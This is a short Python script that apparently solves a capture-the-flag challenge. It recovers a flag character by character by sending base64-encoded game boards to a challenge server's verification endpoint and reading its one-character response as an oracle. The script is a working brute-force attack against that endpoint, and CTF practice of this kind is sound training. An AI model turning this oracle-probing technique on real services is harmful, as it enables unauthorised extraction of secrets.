import requests
import base64
import string
board = [[2,1,1,1,1,1,1,1],[1,1,1,1,1,1,1,1],[1,1,1,1,1,1,1,1],[1,1,1,1,1,1,1,1],[1,1,1,1,1,1,1,1]]
flag = 'CSA{we_all_need_mirrors'
l =[]
def change_board(board,dist):
    for i in range(5):
        for j in range(8):
            board[i][j] =1
    board[0][0] = 2
    if dist <8:
        board[0][dist]= 2
        return board
    else:
        board[dist-7][7]= 2
        return board
found =0
URL ='http://memento.csa-challenge.com:7777/verifygame?level='
while not flag or  flag[-1] != '}':
    for c in string.ascii_lowercase +'_'+'}':
        print('trying: {}'.format(flag+c))
        try_board =change_board(board,(ord(c)%9+1))
        if c == flag[-1]:
            continue
        for _ in range(40):
            res = requests.get(URL+str(len(flag))+'&board='+base64.b64encode(str(try_board)))
            if '1' in res.text:
                flag+=c
                l.append(ord(c)%9+1)
                print l
                print('found: {}'.format(flag))
                found =1
                break
            elif '0' not in res.text:
                print res.text
        if found:
            found =0
            break
            
            